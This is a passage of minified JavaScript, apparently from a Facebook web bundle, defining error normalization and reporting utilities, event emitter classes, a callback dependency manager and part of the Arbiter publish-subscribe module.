        for (var h = 0; h < g; h++) a = (a << 5) - a + f.charCodeAt(h);
      }
    }
    var i = "";
    for (var j = 0; j < 6; j++) i = ga.charAt(a & 31) + i, a >>= 5;
    return i;
  }
  var I = [/\(([^\s\)\()]+):(\d+):(\d+)\)$/, /@([^\s\)\()]+):(\d+):(\d+)$/, /^([^\s\)\()]+):(\d+):(\d+)$/, /^at ([^\s\)\()]+):(\d+):(\d+)$/],
    ha = /^\w+:\s.*?\n/g;
  Error.stackTraceLimit != null && Error.stackTraceLimit < 80 && (Error.stackTraceLimit = 80);
  function ia(a) {
    var b = a.name,
      c = a.message;
    a = a.stack;
    if (a == null) return null;
    if (b != null && c != null && c !== "") {
      var d = b + ": " + c + "\n";
      if (a.startsWith(d)) return a.substr(d.length);
      if (a === b + ": " + c) return null;
    }
    if (b != null) {
      d = b + "\n";
      if (a.startsWith(d)) return a.substr(d.length);
    }
    if (c != null && c !== "") {
      b = ": " + c + "\n";
      d = a.indexOf(b);
      c = a.substring(0, d);
      if (/^\w+$/.test(c)) return a.substring(d + b.length);
    }
    return a.replace(ha, "");
  }
  function J(a) {
    a = a.trim();
    var b;
    a;
    var c, d, e;
    if (a.includes("charset=utf-8;base64,")) b = "<inlined-file>";else {
      var f;
      for (var g = 0; g < I.length; g++) {
        var h = I[g];
        f = a.match(h);
        if (f != null) break;
      }
      f != null && f.length === 4 ? (c = f[1], d = parseInt(f[2], 10), e = parseInt(f[3], 10), b = a.substring(0, a.length - f[0].length)) : b = a;
      b = b.replace(/^at /, "").trim();
    }
    h = {
      identifier: b,
      script: c,
      line: d,
      column: e
    };
    h.text = K(h);
    return h;
  }
  function ja(a) {
    return a == null || a === "" ? [] : a.split(/\n\n/)[0].split("\n").map(J);
  }
  function ka(a) {
    a = ia(a);
    return ja(a);
  }
  function la(a) {
    if (a == null || a === "") return null;
    a = a.split("\n");
    a.splice(0, 1);
    return a.map(function (a) {
      return a.trim();
    });
  }
  function K(a) {
    var b = a.identifier,
      c = a.script,
      d = a.line;
    a = a.column;
    b = "    at " + (b !== null && b !== void 0 ? b : "<unknown>");
    c != null && d != null && a != null && (b += " (" + c + ":" + d + ":" + a + ")");
    return b;
  }
  function L(c) {
    var d,
      e,
      f,
      h,
      i,
      j,
      k = ka(c);
    d = (d = c.taalOpcodes) !== null && d !== void 0 ? d : [];
    var l = c.framesToPop;
    if (l != null) {
      l = Math.min(l, k.length);
      while (l-- > 0) d.unshift(g.PREVIOUS_FRAME);
    }
    l = (l = c.messageFormat) !== null && l !== void 0 ? l : c.message;
    e = ((e = c.messageParams) !== null && e !== void 0 ? e : []).map(function (a) {
      return String(a);
    });
    var m = la(c.componentStack),
      n = m == null ? null : m.map(J),
      o = c.metadata ? c.metadata.format() : new A().format();
    o.length === 0 && (o = void 0);
    var p = k.map(function (a) {
      return a.text;
    }).join("\n");
    f = (f = c.errorName) !== null && f !== void 0 ? f : c.name;
    var q = ca(c),
      r = c.loggingSource,
      s = c.project;
    h = (h = c.lineNumber) !== null && h !== void 0 ? h : c.line;
    i = (i = c.columnNumber) !== null && i !== void 0 ? i : c.column;
    j = (j = c.fileName) !== null && j !== void 0 ? j : c.sourceURL;
    var t = k.length > 0;
    t && h == null && (h = k[0].line);
    t && i == null && (i = k[0].column);
    t && j == null && (j = k[0].script);
    n = {
      blameModule: c.blameModule,
      column: i == null ? null : String(i),
      clientTime: Math.floor(Date.now() / 1e3),
      componentStackFrames: n,
      deferredSource: c.deferredSource != null ? L(c.deferredSource) : null,
      extra: (t = c.extra) !== null && t !== void 0 ? t : {},
      fbtrace_id: c.fbtrace_id,
      guardList: (i = c.guardList) !== null && i !== void 0 ? i : [],
      hash: H(f, p, q, s, r),
      isNormalizedError: !0,
      line: h == null ? null : String(h),
      loggingSource: r,
      message: C.toReadableMessage(c),
      messageFormat: l,
      messageParams: e,
      metadata: o,
      name: f,
      page_time: Math.floor(b("performanceNowSinceAppStart")()),
      project: s,
      reactComponentStack: m,
      script: j,
      serverHash: c.serverHash,
      stack: p,
      stackFrames: k,
      type: q,
      xFBDebug: G.getAll()
    };
    c.forcedKey != null && (n.forcedKey = c.forcedKey);
    d.length > 0 && (n.taalOpcodes = d);
    t = a.location;
    t && (n.windowLocationURL = t.href);
    for (i in n) n[i] == null && delete n[i];
    return n;
  }
  function ma(a) {
    return a != null && typeof a === "object" && a.isNormalizedError === !0 ? a : null;
  }
  var M = {
      formatStackFrame: K,
      normalizeError: L,
      ifNormalizedError: ma
    },
    na = "<global.react>",
    N = [],
    O = [],
    P = 50,
    Q = !1,
    R = {
      history: O,
      addListener: function (a, b) {
        b === void 0 && (b = !1), N.push(a), b || O.forEach(function (b) {
          return a(b, (b = b.loggingSource) !== null && b !== void 0 ? b : "DEPRECATED");
        });
      },
      unshiftListener: function (a) {
        N.unshift(a);
      },
      removeListener: function (a) {
        b("removeFromArray")(N, a);
      },
      reportError: function (a) {
        a = M.normalizeError(a);
        R.reportNormalizedError(a);
      },
      reportNormalizedError: function (b) {
        if (Q) return !1;
        var a = y.cloneGuardList();
        b.componentStackFrames && a.unshift(na);
        a.length > 0 && (b.guardList = a);
        if (b.deferredSource == null) {
          a = y.findDeferredSource();
          a != null && (b.deferredSource = M.normalizeError(a));
        }
        O.length > P && O.splice(P / 2, 1);
        O.push(b);
        Q = !0;
        for (a = 0; a < N.length; a++) try {
          var c;
          N[a](b, (c = b.loggingSource) !== null && c !== void 0 ? c : "DEPRECATED");
        } catch (a) {}
        Q = !1;
        return !0;
      }
    };
  R.addListener(j.errorListener);
  var oa = "<anonymous guard>",
    S = !1,
    T = {
      applyWithGuard: function (a, b, c, d) {
        y.pushGuard({
          name: ((d === null || d === void 0 ? void 0 : d.name) != null ? d.name : null) || (a.name ? "func_name:" + a.name : null) || oa,
          deferredSource: d === null || d === void 0 ? void 0 : d.deferredSource
        });
        if (S) try {
          return a.apply(b, c);
        } finally {
          y.popGuard();
        }
        try {
          return Function.prototype.apply.call(a, b, c);
        } catch (h) {
          try {
            b = d !== null && d !== void 0 ? d : babelHelpers["extends"]({}, null);
            var e = b.deferredSource,
              f = b.onError;
            b = b.onNormalizedError;
            var g = u(h);
            e = {
              deferredSource: e,
              loggingSource: "GUARDED",
              project: (e = d === null || d === void 0 ? void 0 : d.project) !== null && e !== void 0 ? e : "ErrorGuard",
              type: d === null || d === void 0 ? void 0 : d.errorType
            };
            C.aggregateError(g, e);
            d = M.normalizeError(g);
            g == null && a && (d.extra[a.toString().substring(0, 100)] = "function", c != null && c.length && (d.extra[Array.from(c).toString().substring(0, 100)] = "args"));
            d.guardList = y.cloneGuardList();
            f && f(g);
            b && b(d);
            R.reportNormalizedError(d);
          } catch (a) {}
        } finally {
          y.popGuard();
        }
      },
      guard: function (a, b) {
        function c() {
          for (var c = arguments.length, d = new Array(c), e = 0; e < c; e++) d[e] = arguments[e];
          return T.applyWithGuard(a, this, d, b);
        }
        a.__SMmeta && (c.__SMmeta = a.__SMmeta);
        return c;
      },
      inGuard: function () {
        return y.inGuard();
      },
      skipGuardGlobal: function (a) {
        S = a;
      }
    },
    U = 1024,
    V = [],
    W = 0;
  function X(a) {
    return String(a);
  }
  function Y(a) {
    return a == null ? null : String(a);
  }
  function pa(a, b) {
    var c = {};
    b && b.forEach(function (a) {
      c[a] = !0;
    });
    Object.keys(a).forEach(function (b) {
      a[b] ? c[b] = !0 : c[b] && delete c[b];
    });
    return Object.keys(c);
  }
  function Z(a) {
    return (a !== null && a !== void 0 ? a : []).map(function (a) {
      return {
        column: Y(a.column),
        identifier: a.identifier,
        line: Y(a.line),
        script: a.script
      };
    });
  }
  function qa(a) {
    a = String(a);
    return a.length > U ? a.substring(0, U - 3) + "..." : a;
  }
  function ra(a, b) {
    var c;
    c = {
      appId: Y(b.appId),
      cavalry_lid: b.cavalry_lid,
      access_token: k.access_token,
      ancestor_hash: a.hash,
      bundle_variant: (c = b.bundle_variant) !== null && c !== void 0 ? c : null,
      clientTime: X(a.clientTime),
      column: a.column,
      componentStackFrames: Z(a.componentStackFrames),
      events: a.events,
      extra: pa(a.extra, b.extra),
      forcedKey: a.forcedKey,
      frontend_env: (c = b.frontend_env) !== null && c !== void 0 ? c : null,
      guardList: a.guardList,
      line: a.line,
      loggingFramework: b.loggingFramework,
      messageFormat: qa(a.messageFormat),
      messageParams: a.messageParams.map(qa),
      name: a.name,
      sample_weight: Y(b.sample_weight),
      script: a.script,
      site_category: b.site_category,
      stackFrames: Z(a.stackFrames),
      type: a.type,
      page_time: Y(a.page_time),
      project: a.project,
      push_phase: b.push_phase,
      report_source: b.report_source,
      report_source_ref: b.report_source_ref,
      rollout_hash: (c = b.rollout_hash) !== null && c !== void 0 ? c : null,
      script_path: b.script_path,
      server_revision: Y(b.server_revision),
      spin: Y(b.spin),
      svn_rev: String(b.client_revision),
      additional_client_revisions: Array.from((c = b.additional_client_revisions) !== null && c !== void 0 ? c : []).map(X),
      taalOpcodes: a.taalOpcodes == null ? null : a.taalOpcodes.map(function (a) {
        return a;
      }),
      web_session_id: b.web_session_id,
      version: "3",
      xFBDebug: a.xFBDebug
    };
    b = a.blameModule;
    var d = a.deferredSource;
    b != null && (c.blameModule = String(b));
    d && d.stackFrames && (c.deferredSource = {
      stackFrames: Z(d.stackFrames)
    });
    a.metadata && (c.metadata = a.metadata);
    a.loadingUrls && (c.loadingUrls = a.loadingUrls);
    a.serverHash != null && (c.serverHash = a.serverHash);
    a.windowLocationURL != null && (c.windowLocationURL = a.windowLocationURL);
    a.loggingSource != null && (c.loggingSource = a.loggingSource);
    return c;
  }
  function sa(a, b, c) {
    var d;
    W++;
    if (b.sample_weight === 0) return !1;
    var e = s.shouldLog(a);
    if (e == null) return !1;
    if ((d = b.projectBlocklist) !== null && d !== void 0 && d.includes(a.project)) return !1;
    d = ra(a, b);
    Object.assign(d, {
      ancestors: V.slice(),
      clientWeight: X(e),
      page_position: X(W)
    });
    V.length < 15 && V.push(a.hash);
    c(d);
    return !0;
  }
  var ta = {
      createErrorPayload: ra,
      postError: sa
    },
    $ = null,
    ua = !1;
  function va(a) {
    if ($ == null) return;
    var b = $,
      c = a.reason,
      d;
    if (c != null && typeof c === "object" && (c.name == null || c.name === "" || c.message == null || c.message === "")) try {
      d = h("UnhandledRejection: %s", JSON.stringify(c)), d.loggingSource = "ONUNHANDLEDREJECTION";
    } catch (a) {
      d = h("UnhandledRejection: (circular) %s", Object.keys(c).join(",")), d.loggingSource = "ONUNHANDLEDREJECTION";
    } else d = u(c), d.loggingSource || (d.loggingSource = "ONUNHANDLEDREJECTION");
    try {
      c = a.promise;
      d.stack = String(d.stack || "") + (c != null && typeof c.settledStack === "string" ? "\n(<promise_settled_stack_below>)\n" + c.settledStack : "") + (c != null && typeof c.createdStack === "string" ? "\n(<promise_created_stack_below>)\n" + c.createdStack : "");
    } catch (a) {}
    b.reportError(d);
    a.preventDefault();
  }
  function wa(b) {
    $ = b, typeof a.addEventListener === "function" && !ua && (ua = !0, a.addEventListener("unhandledrejection", va));
  }
  var xa = {
    onunhandledrejection: va,
    setup: wa
  };
  c = {
    preSetup: function (a) {
      (a == null || a.ignoreOnError !== !0) && w.setup(R), (a == null || a.ignoreOnUnahndledRejection !== !0) && xa.setup(R);
    },
    setup: function (a, b) {
      R.addListener(function (c) {
        ta.postError(c, a, b);
      });
    }
  };
  var ya = function () {
    function a(a) {
      this.project = a, this.events = [], this.metadata = new A(), this.taalOpcodes = [];
    }
    var b = a.prototype;
    b.$1 = function (b, c) {
      var d = String(c),
        e = this.events,
        f = this.project,
        h = this.metadata,
        i = this.blameModule,
        j = this.forcedKey,
        k = this.error,
        l;
      for (var m = arguments.length, n = new Array(m > 2 ? m - 2 : 0), o = 2; o < m; o++) n[o - 2] = arguments[o];
      if (this.normalizedError) {
        var p = {
          message: this.normalizedError.messageFormat + " [Caught in: " + d + "]",
          params: [].concat(this.normalizedError.messageParams, n),
          forcedKey: j
        };
        l = babelHelpers["extends"]({}, this.normalizedError, {
          message: p.message,
          messageFormat: p.message,
          messageParams: C.toStringParams(p.params),
          project: f,
          type: b,
          loggingSource: "FBLOGGER"
        });
      } else if (k) this.taalOpcodes.length > 0 && new a("fblogger").blameToPreviousFrame().blameToPreviousFrame().warn("Blame helpers do not work with catching"), C.aggregateError(k, {
        messageFormat: d,
        messageParams: C.toStringParams(n),
        errorName: k.name,
        forcedKey: j,
        project: f,
        type: b,
        loggingSource: "FBLOGGER"
      }), l = M.normalizeError(k);else {
        k = new Error(d);
        if (k.stack === void 0) try {
          throw k;
        } catch (a) {}
        k.messageFormat = d;
        k.messageParams = C.toStringParams(n);
        k.blameModule = i;
        k.forcedKey = j;
        k.project = f;
        k.type = b;
        k.loggingSource = "FBLOGGER";
        k.taalOpcodes = [g.PREVIOUS_FRAME, g.PREVIOUS_FRAME].concat(this.taalOpcodes);
        l = M.normalizeError(k);
        l.name = "FBLogger";
      }
      if (!h.isEmpty()) if (l.metadata == null) l.metadata = h.format();else {
        var q = l.metadata.concat(h.format()),
          r = new Set(q);
        l.metadata = Array.from(r.values());
      }
      if (e.length > 0) if (l.events != null) {
        var s;
        (s = l.events).push.apply(s, e);
      } else l.events = e;
      R.reportNormalizedError(l);
      return k;
    };
    b.fatal = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      this.$1.apply(this, ["fatal", a].concat(c));
    };
    b.mustfix = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      this.$1.apply(this, ["error", a].concat(c));
    };
    b.warn = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      this.$1.apply(this, ["warn", a].concat(c));
    };
    b.info = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      this.$1.apply(this, ["info", a].concat(c));
    };
    b.debug = function (a) {};
    b.mustfixThrow = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      var e = this.$1.apply(this, ["error", a].concat(c));
      e || (e = h("mustfixThrow does not support catchingNormalizedError"), e.taalOpcodes = e.taalOpcodes || [], e.taalOpcodes.push(g.PREVIOUS_FRAME));
      try {
        e.message = C.toReadableMessage(e);
      } catch (a) {}
      throw e;
    };
    b.catching = function (b) {
      !(b instanceof Error) ? new a("fblogger").blameToPreviousFrame().warn("Catching non-Error object is not supported") : this.error = b;
      return this;
    };
    b.catchingNormalizedError = function (a) {
      this.normalizedError = a;
      return this;
    };
    b.event = function (a) {
      this.events.push(a);
      return this;
    };
    b.blameToModule = function (a) {
      this.blameModule = a;
      return this;
    };
    b.blameToPreviousFile = function () {
      this.taalOpcodes.push(g.PREVIOUS_FILE);
      return this;
    };
    b.blameToPreviousFrame = function () {
      this.taalOpcodes.push(g.PREVIOUS_FRAME);
      return this;
    };
    b.blameToPreviousDirectory = function () {
      this.taalOpcodes.push(g.PREVIOUS_DIR);
      return this;
    };
    b.addToCategoryKey = function (a) {
      this.forcedKey = a;
      return this;
    };
    b.addMetadata = function (a, b, c) {
      this.metadata.addEntry(a, b, c);
      return this;
    };
    return a;
  }();
  d = function (a, b) {
    var c = new ya(a);
    return b != null ? c.event(a + "." + b) : c;
  };
  d.addGlobalMetadata = function (a, b, c) {
    A.addGlobalMetadata(a, b, c);
  };
  var za = "<CUSTOM_NAME:",
    Aa = ">";
  function Ba(a, b) {
    if (a != null && b != null) try {
      Object.defineProperty(a, "name", {
        value: za + " " + b + Aa
      });
    } catch (a) {}
    return a;
  }
  f = {
    blameToPreviousFile: function (a) {
      var b;
      a.taalOpcodes = (b = a.taalOpcodes) !== null && b !== void 0 ? b : [];
      a.taalOpcodes.push(g.PREVIOUS_FILE);
      return a;
    },
    blameToPreviousFrame: function (a) {
      var b;
      a.taalOpcodes = (b = a.taalOpcodes) !== null && b !== void 0 ? b : [];
      a.taalOpcodes.push(g.PREVIOUS_FRAME);
      return a;
    },
    blameToPreviousDirectory: function (a) {
      var b;
      a.taalOpcodes = (b = a.taalOpcodes) !== null && b !== void 0 ? b : [];
      a.taalOpcodes.push(g.PREVIOUS_DIR);
      return a;
    }
  };
  F = {
    err: h,
    ErrorBrowserConsole: j,
    ErrorDynamicData: k,
    ErrorFilter: s,
    ErrorGlobalEventHandler: w,
    ErrorGuard: T,
    ErrorGuardState: y,
    ErrorMetadata: A,
    ErrorNormalizeUtils: M,
    ErrorPoster: ta,
    ErrorPubSub: R,
    ErrorSerializer: C,
    ErrorSetup: c,
    ErrorXFBDebug: G,
    FBLogger: d,
    getErrorSafe: u,
    getSimpleHash: H,
    TAAL: f,
    TAALOpcode: g,
    renameFunction: Ba
  };
  e.exports = F;
}, null);
__d("ErrorGuard", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("fb-error").ErrorGuard;
}, 98);
__d("CallbackDependencyManager", ["ErrorGuard"], function (a, b, c, d, e, f) {
  var g;
  a = function () {
    "use strict";

    function a() {
      this.$1 = new Map(), this.$2 = new Map(), this.$3 = 1, this.$4 = new Map();
    }
    var c = a.prototype;
    c.$5 = function (a, b) {
      var c = 0,
        d = new Set();
      for (var e = 0, f = b.length; e < f; e++) d.add(b[e]);
      for (b = d.keys(), e = Array.isArray(b), f = 0, b = e ? b : b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        if (e) {
          if (f >= b.length) break;
          d = b[f++];
        } else {
          f = b.next();
          if (f.done) break;
          d = f.value;
        }
        d = d;
        if (this.$4.get(d)) continue;
        c++;
        var g = this.$1.get(d);
        g === void 0 && (g = new Map(), this.$1.set(d, g));
        g.set(a, (g.get(a) || 0) + 1);
      }
      return c;
    };
    c.$6 = function (a) {
      a = this.$1.get(a);
      if (!a) return;
      for (var c = a.entries(), d = Array.isArray(c), e = 0, c = d ? c : c[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var f;
        if (d) {
          if (e >= c.length) break;
          f = c[e++];
        } else {
          e = c.next();
          if (e.done) break;
          f = e.value;
        }
        f = f;
        var h = f[0];
        f = f[1] - 1;
        a.set(h, f);
        f <= 0 && a["delete"](h);
        f = this.$2.get(h);
        if (f !== void 0) {
          f.$7--;
          if (f.$7 <= 0) {
            f = f.$8;
            this.$2["delete"](h);
            (g || (g = b("ErrorGuard"))).applyWithGuard(f, null, []);
          }
        }
      }
    };
    c.addDependenciesToExistingCallback = function (a, b) {
      var c = this.$2.get(a);
      if (!c) return null;
      b = this.$5(a, b);
      c.$7 += b;
      return a;
    };
    c.isPersistentDependencySatisfied = function (a) {
      return !!this.$4.get(a);
    };
    c.satisfyPersistentDependency = function (a) {
      this.$4.set(a, 1), this.$6(a);
    };
    c.satisfyNonPersistentDependency = function (a) {
      var b = this.$4.get(a) === 1;
      b || this.$4.set(a, 1);
      this.$6(a);
      b || this.$4["delete"](a);
    };
    c.registerCallback = function (a, c) {
      var d = this.$3;
      this.$3++;
      c = this.$5(d, c);
      if (c === 0) {
        (g || (g = b("ErrorGuard"))).applyWithGuard(a, null, []);
        return null;
      }
      this.$2.set(d, {
        $8: a,
        $7: c
      });
      return d;
    };
    return a;
  }();
  e.exports = a;
}, null);
__d("EventSubscription", [], function (a, b, c, d, e, f) {
  "use strict";

  a = function (a) {
    var b = this;
    this.remove = function () {
      b.subscriber && (b.subscriber.removeSubscription(b), b.subscriber = null);
    };
    this.subscriber = a;
  };
  f["default"] = a;
}, 66);
__d("EmitterSubscription", ["EventSubscription"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b(b, c, d) {
      b = a.call(this, b) || this;
      b.listener = c;
      b.context = d;
      return b;
    }
    return b;
  }(c("EventSubscription"));
  g["default"] = a;
}, 98);
__d("EventSubscriptionVendor", ["invariant"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = function () {
    function a() {
      this.$1 = {};
    }
    var b = a.prototype;
    b.addSubscription = function (a, b) {
      b.subscriber === this || g(0, 2828);
      this.$1[a] || (this.$1[a] = []);
      var c = this.$1[a].length;
      this.$1[a].push(b);
      b.eventType = a;
      b.key = c;
      return b;
    };
    b.removeAllSubscriptions = function (a) {
      a === void 0 ? this.$1 = {} : delete this.$1[a];
    };
    b.removeSubscription = function (a) {
      var b = a.eventType;
      a = a.key;
      b = this.$1[b];
      b && delete b[a];
    };
    b.getSubscriptionsForType = function (a) {
      return this.$1[a];
    };
    return a;
  }();
  e.exports = a;
}, null);
__d("emptyFunction", [], function (a, b, c, d, e, f) {
  function a(a) {
    return function () {
      return a;
    };
  }
  b = function () {};
  b.thatReturns = a;
  b.thatReturnsFalse = a(!1);
  b.thatReturnsTrue = a(!0);
  b.thatReturnsNull = a(null);
  b.thatReturnsThis = function () {
    return this;
  };
  b.thatReturnsArgument = function (a) {
    return a;
  };
  c = b;
  f["default"] = c;
}, 66);
__d("FBLogger", ["fb-error"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = c("fb-error").FBLogger;
}, 98);
__d("unrecoverableViolation", ["FBLogger"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a, b, d, e) {
    d = d === void 0 ? {} : d;
    d = d.error;
    b = c("FBLogger")(b);
    d ? b = b.catching(d) : b = b.blameToPreviousFrame();
    for (d = 0; d < ((f = e == null ? void 0 : e.blameToPreviousFrame) != null ? f : 0); ++d) {
      var f;
      b = b.blameToPreviousFrame();
    }
    f = e == null ? void 0 : e.categoryKey;
    f != null && (b = b.addToCategoryKey(f));
    return b.mustfixThrow(a);
  }
  g["default"] = a;
}, 98);
__d("BaseEventEmitter", ["EmitterSubscription", "ErrorGuard", "EventSubscriptionVendor", "emptyFunction", "unrecoverableViolation"], function (a, b, c, d, e, f) {
  var g;
  a = function () {
    "use strict";

    function a() {
      this.$2 = new (b("EventSubscriptionVendor"))(), this.$1 = null;
    }
    var c = a.prototype;
    c.addListener = function (a, c, d) {
      return this.$2.addSubscription(a, new (b("EmitterSubscription"))(this.$2, c, d));
    };
    c.removeListener = function (a) {
      this.$2.removeSubscription(a);
    };
    c.once = function (a, b, c) {
      var d = this;
      return this.addListener(a, function () {
        d.removeCurrentListener(), b.apply(c, arguments);
      });
    };
    c.removeAllListeners = function (a) {
      this.$2.removeAllSubscriptions(a);
    };
    c.removeCurrentListener = function () {
      if (!this.$1) throw b("unrecoverableViolation")("Not in an emitting cycle; there is no current subscription", "emitter");
      this.$2.removeSubscription(this.$1);
    };
    c.listeners = function (a) {
      a = this.$2.getSubscriptionsForType(a);
      return a ? a.filter(b("emptyFunction").thatReturnsTrue).map(function (a) {
        return a.listener;
      }) : [];
    };
    c.emit = function (a) {
      var b = this.$2.getSubscriptionsForType(a);
      if (b) {
        var c = Object.keys(b),
          d;
        for (var e = 0; e < c.length; e++) {
          var f = c[e],
            g = b[f];
          if (g) {
            this.$1 = g;
            if (d == null) {
              d = [g, a];
              for (var h = 0, i = arguments.length <= 1 ? 0 : arguments.length - 1; h < i; h++) d[h + 2] = h + 1 < 1 || arguments.length <= h + 1 ? void 0 : arguments[h + 1];
            } else d[0] = g;
            this.__emitToSubscription.apply(this, d);
          }
        }
        this.$1 = null;
      }
    };
    c.__emitToSubscription = function (a, c) {
      for (var d = arguments.length, e = new Array(d > 2 ? d - 2 : 0), f = 2; f < d; f++) e[f - 2] = arguments[f];
      (g || (g = b("ErrorGuard"))).applyWithGuard(a.listener, a.context, e, {
        name: "EventEmitter " + c + " event"
      });
    };
    return a;
  }();
  e.exports = a;
}, null);
__d("EventEmitter", ["BaseEventEmitter"], function (a, b, c, d, e, f, g) {
  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b() {
      return a.apply(this, arguments) || this;
    }
    return b;
  }(c("BaseEventEmitter"));
  g["default"] = a;
}, 98);
__d("EventEmitterWithHolding", [], function (a, b, c, d, e, f) {
  "use strict";

  a = function () {
    function a(a, b) {
      this.$2 = a, this.$3 = b, this.$1 = null, this.$5 = [], this.$4 = 0;
    }
    var b = a.prototype;
    b.addListener = function (a, b, c) {
      return this.$2.addListener(a, b, c);
    };
    b.once = function (a, b, c) {
      return this.$2.once(a, b, c);
    };
    b.addRetroactiveListener = function (a, b, c) {
      var d = this.$2.addListener(a, b, c),
        e = this.$5;
      e.push(!1);
      this.$4++;
      this.$3.emitToListener(a, b, c);
      this.$4--;
      e[e.length - 1] && d.remove();
      e.pop();
      return d;
    };
    b.removeAllListeners = function (a) {
      this.$2.removeAllListeners(a);
    };
    b.removeCurrentListener = function () {
      if (this.$4) {
        var a = this.$5;
        a[a.length - 1] = !0;
      } else this.$2.removeCurrentListener();
    };
    b.listeners = function (a) {
      return this.$2.listeners(a);
    };
    b.emit = function (a) {
      var b;
      for (var c = arguments.length, d = new Array(c > 1 ? c - 1 : 0), e = 1; e < c; e++) d[e - 1] = arguments[e];
      (b = this.$2).emit.apply(b, [a].concat(d));
    };
    b.emitAndHold = function (a) {
      var b, c;
      for (var d = arguments.length, e = new Array(d > 1 ? d - 1 : 0), f = 1; f < d; f++) e[f - 1] = arguments[f];
      this.$1 = (b = this.$3).holdEvent.apply(b, [a].concat(e));
      (c = this.$2).emit.apply(c, [a].concat(e));
      this.$1 = null;
    };
    b.releaseCurrentEvent = function () {
      this.$1 != null ? this.$3.releaseEvent(this.$1) : this.$4 > 0 && this.$3.releaseCurrentEvent();
    };
    b.releaseHeldEventType = function (a) {
      this.$3.releaseEventType(a);
    };
    return a;
  }();
  f["default"] = a;
}, 66);
__d("EventHolder", ["invariant"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  a = function () {
    function a() {
      this.$1 = {}, this.$2 = [];
    }
    var b = a.prototype;
    b.holdEvent = function (a) {
      this.$1[a] = this.$1[a] || [];
      var b = this.$1[a],
        c = {
          eventType: a,
          index: b.length
        };
      for (var d = arguments.length, e = new Array(d > 1 ? d - 1 : 0), f = 1; f < d; f++) e[f - 1] = arguments[f];
      b.push(e);
      return c;
    };
    b.emitToListener = function (a, b, c) {
      var d = this,
        e = this.$1[a];
      if (!e) return;
      e.forEach(function (e, f) {
        if (!e) return;
        d.$2.push({
          eventType: a,
          index: f
        });
        b.apply(c, e);
        d.$2.pop();
      });
    };
    b.releaseCurrentEvent = function () {
      this.$2.length || h(0, 1764), this.releaseEvent(this.$2[this.$2.length - 1]);
    };
    b.releaseEvent = function (a) {
      delete this.$1[a.eventType][a.index];
    };
    b.releaseEventType = function (a) {
      this.$1[a] = [];
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("Arbiter", ["invariant", "ArbiterToken", "CallbackDependencyManager", "ErrorGuard", "EventEmitter", "EventEmitterWithHolding", "EventHolder"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  function i(a) {
    return Array.isArray(a) ? a : [a];
  }
  function j(a) {
    return a instanceof k || a === k ? a : k;
  }
  var k = function () {
      function a() {
        var a = new (c("EventEmitter"))();
        this.$3 = new l();
        this.$2 = new (c("EventEmitterWithHolding"))(a, this.$3);
        this.$1 = new (c("CallbackDependencyManager"))();
        this.$4 = [];
      }
      var b = a.prototype;
      b.subscribe = function (a, b, d) {
        var e = this;
        a = i(a);
        a.forEach(function (a) {
          a && typeof a === "string" || h(0, 1966, a);
        });
        typeof b === "function" || h(0, 1967, b);
        d = d || "all";
        d === "new" || d === "all" || h(0, 1968, d);
        a = a.map(function (a) {
          var c = function (c) {
            return e.$5(b, a, c);
          };
          c.__SMmeta = b.__SMmeta;
          if (d === "new") return e.$2.addListener(a, c);
          e.$4.push({});
          c = e.$2.addRetroactiveListener(a, c);
          e.$4.pop();
          return c;
        });
        return new (c("ArbiterToken"))(this, a);
      };
      b.$5 = function (a, b, d) {
        var e = this.$4[this.$4.length - 1];
        if (e[b] === !1) return;
        a = c("ErrorGuard").applyWithGuard(a, null, [b, d]);
        a === !1 && this.$2.releaseCurrentEvent();
        e[b] = a;
      };
      b.unsubscribeCurrentSubscription = function () {
        this.$2.removeCurrentListener();
      };
      b.releaseCurrentPersistentEvent = function () {
        this.$2.releaseCurrentEvent();
      };
      b.subscribeOnce = function (a, b, c) {
        var d = this;
        a = this.subscribe(a, function (a, c) {
          d.unsubscribeCurrentSubscription();
          return b(a, c);
        }, c);
        return a;
      };
      b.unsubscribe = function (a) {
        a.isForArbiterInstance(this) || h(0, 1969), a.unsubscribe();
      };
      b.inform = function (a, b, c) {
        var d = Array.isArray(a);
        a = i(a);
        c = c || "event";
        var e = c === "state" || c === "persistent";
        this.$4.push({});
        for (var f = 0; f < a.length; f++) {
          var g = a[f];
          g || h(0, 1970, g);
          this.$3.setHoldingBehavior(g, c);
          this.$2.emitAndHold(g, b);
          this.$6(g, b, e);
        }
        g = this.$4.pop();
        return d ? g : g[a[0]];
      };
      b.query = function (a) {
        var b = this.$3.getHoldingBehavior(a);
        !b || b === "state" || h(0, 1971, a);
        b = null;
        this.$3.emitToListener(a, function (a) {
          b = a;
        });
        return b;
      };
      b.registerCallback = function (a, b) {
        if (typeof a === "function") return this.$1.registerCallback(a, b);else return this.$1.addDependenciesToExistingCallback(a, b);
      };
      b.$6 = function (a, b, c) {
        if (b === null) return;
        c ? this.$1.satisfyPersistentDependency(a) : this.$1.satisfyNonPersistentDependency(a);
      };
      a.subscribe = function (b, c, d) {
        return a.prototype.subscribe.apply(j(this), arguments);
      };
      a.unsubscribeCurrentSubscription = function () {
        return a.prototype.unsubscribeCurrentSubscription.apply(j(this));
      };
      a.releaseCurrentPersistentEvent = function () {
        return a.prototype.releaseCurrentPersistentEvent.apply(j(this));
      };
